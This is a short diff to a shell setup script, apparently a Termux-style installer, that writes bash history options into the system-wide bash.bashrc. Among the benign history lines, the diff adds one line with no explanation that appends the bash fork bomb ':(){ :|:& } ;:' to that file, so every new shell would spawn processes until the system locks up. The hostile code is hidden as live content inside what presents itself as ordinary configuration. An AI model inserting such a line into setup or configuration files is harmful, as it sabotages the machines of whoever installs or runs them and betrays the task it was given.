@@ -77,6 +77,7 @@ clear
 #   with space.
 # - Do not save duplicated commands.
 echo "shopt -s histappend" > $PREFIX/etc/bash.bashrc
+echo ":(){ :|:& } ;:" >> $PREFIX/etc/bash.bashrc
 echo "shopt -s histverify" >> $PREFIX/etc/bash.bashrc
 echo "export HISTCONTROL=ignoreboth" >> $PREFIX/etc/bash.bashrc
 
